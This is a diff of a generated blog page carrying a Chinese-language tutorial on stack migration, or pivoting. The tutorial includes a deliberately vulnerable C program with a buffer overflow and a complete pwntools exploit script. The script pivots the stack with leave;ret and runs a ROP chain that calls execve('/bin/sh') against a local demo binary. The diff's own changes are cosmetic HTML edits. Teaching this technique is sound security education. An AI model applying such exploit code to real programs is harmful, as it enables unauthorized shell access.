@@ -219,11 +219,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -315,7 +315,7 @@
 <li>透過overflow將rbp填成ROP Chain開始位置address-8</li>
 <li>return address填入leave;ret 的gadget</li>
 </ul>
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/Stack.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/Stack.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/Stack.png" class="">
 
 <p>有一塊可以寫ROP gadget的地方</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090(這塊記憶體開始的位置)</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
@@ -327,7 +327,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*0x10210&lt;-rsp</span><br><span class="line">AAAAAAAA</span><br><span class="line">*0x10200&lt;-rbp</span><br><span class="line">0x601090(0x601098-0x8)</span><br><span class="line">leave;ret</span><br></pre></td></tr></table></figure>
 
 <p>首先一路執行下來<br>通常最後會有個</p>
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/leavecommon.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/leavecommon.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/leavecommon.png" class="">
 
 <p>leave;ret<br>而leave的意思是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>
@@ -345,23 +345,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)&lt;-rsp</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
 <p>這樣就會開始執行ROP gadget了</p>
 <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>開NX不能寫shellcode</p>
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/checksec.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/checksec.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/checksec.png" class="">
 
 <p>然後其實沒開canary</p>
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/NOCANARY.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/NOCANARY.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/NOCANARY.png" class="">
 
 
 <h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>\</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> s[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me your name: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me your ROP: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>首先name這塊區域夠大了，應該可以寫ROPgadget，另外s的部份太小了，要用stack migration來改rsp的位置</p>
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/haveleave.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/haveleave.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/haveleave.png" class="">
 
 <p>另外最後有leave</p>
 <ul>
 <li>execve(‘&#x2F;bin&#x2F;sh’)</li>
 </ul>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -385,8 +384,7 @@
 <td>envp(這裡&#x3D;0)</td>
 </tr>
 </tbody></table>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>gadget</th>
@@ -428,7 +426,7 @@
 <p>這樣就可以讓rsp移到一塊大的記憶體來放ROPgadget，另外把也把&#x2F;bin&#x2F;sh放到這塊記憶體開頭這樣就可以抓到了<br>(可以按照上面的邏輯自己推一遍)</p>
 <h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">a=<span class="built_in">input</span>(<span class="string">&#x27;open debug?&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./demo_stack_pivoting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x4516c7</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x40186a</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x40f40e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_ret&#x27;</span>:<span class="number">0x40176f</span>,</span><br><span class="line">    <span class="string">&#x27;leave_ret&#x27;</span>:<span class="number">0x401dd0</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x4012d3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:<span class="number">0x4c3300</span>,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name_payload=flat(STACKvar[<span class="string">&#x27;shell&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rdx_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">s_payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x4c3300</span>)+p64(ROPvar[<span class="string">&#x27;leave_ret&#x27;</span>])</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your name: &#x27;</span>,name_payload)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your ROP: &#x27;</span>,s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">                     </span><br></pre></td></tr></table></figure>
 
-<div class="img-item" data-src="/2024/05/21/Stack-Migration/getshell.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/getshell.png" class=""></div>
+<img src="/2024/05/21/Stack-Migration/getshell.png" class="">
 
 <p>getshell!!!</p>
 
@@ -518,7 +516,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -570,11 +568,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
